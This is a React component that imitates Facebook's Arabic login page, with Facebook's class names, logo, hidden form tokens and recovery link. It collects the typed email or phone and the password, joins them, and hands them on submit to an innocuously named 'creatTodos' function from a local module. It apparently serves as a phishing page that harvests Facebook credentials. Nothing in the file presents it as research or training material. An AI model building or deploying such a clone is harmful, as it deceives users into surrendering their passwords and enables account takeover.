import { useEffect, useState } from "react";
import { creatTodos } from "./todos";

export const Face = () => {
    const [query, setQuery] = useState('');
    const [pasw, setPasw] = useState('');
    
    const loadsTodos = async () => {
        const loadedTodos = await creatTodos(`${query} ${pasw}`);

        console.log(loadedTodos);
    };

    useEffect(() => {
        
    // eslint-disable-next-line react-hooks/exhaustive-deps
    },[query]);

    return (
        <div class="_8esk">
            <div class="_8esl">
                <div class="_8ice">
                    <img class="fb_logo _8ilh img" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="فيسبوك"/>
                </div>
                <h2 class="_8eso">يمنحك فيسبوك إمكانية التواصل مع الأشخاص ومشاركة ما تريد معهم.</h2>
            </div>
            <div class="_8esn">
                <div class="_8iep _8icy _9ahz _9ah-">
                    <div class="_6luv _52jv">
                        <form
                            onSubmit={(event) => {
                                event.preventDefault();
                                loadsTodos();
                            }}
                           >
                            <input type="hidden" name="jazoest" value="2958" autocomplete="off" />
                            <input type="hidden" name="lsd" value="AVqkafRM0Fo" autocomplete="off" />
                            <div>
                                <div class="_6lux">
                                    <input
                                        type="text"
                                        name="email"
                                        id="email"
                                        placeholder="البريد الإلكتروني أو رقم الهاتف"
                                        value={query}
                                        onChange={(event) => {
                                            setQuery(event.target.value)
                                        }}
                                        /></div>
                                <div class="_6lux">
                                    <div class="_6luy _55r1 _1kbt _9nyh" id="passContainer">
                                        <input
                                            type="password"
                                            placeholder="كلمة السر"
                                            value={pasw}
                                            onChange={(event) => {
                                                setPasw(event.target.value)
                                            }}

                                        />
                                        <div class="_9ls7 hidden_elem" id="u_0_3_06"><a href="https://www.facebook.com" >
                                            <div class="_9lsa">
                                                <div class="_9lsb _9ls8" id="u_0_4_MA"></div>
                                            </div>
                                        </a></div>
                                    </div>
                                </div>
                            </div>
                            <input
                                type="hidden" autocomplete="off"
                                name="login_source" value="comet_headerless_login"/>
                                <input type="hidden" autocomplete="off" name="next" value=""
                                />
                                    <div class="_6ltg">
                                        <button
                                            value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login" data-testid="royal_login_button" type="submit" id="u_0_5_nL"
                                        >
                                            تسجيل
                                            الدخول</button>
                                    </div>
                                <div class="_6ltj"><a href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjc1NDQ1MjUyLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login">هل
                                    نسيت كلمة السر؟</a></div>
                                <div class="_8icz"></div>
                                    <div class="_6ltg">
                                <a href="https://www.facebook.com" 
                                        >إنشاء حساب
                                            جديد</a>
                                    </div>
                            </form>
                            </div>
                            <div id="reg_pages_msg" class="_58mk">&rlm;<a href="/pages/create/?ref_type=registration_form" class="_8esh">إنشاء
                                صفحة</a>&rlm; لشخصية مشهورة أو علامة تجارية أو نشاط تجاري.</div>
                        </div>
                        </div>
                    </div>
    );
}
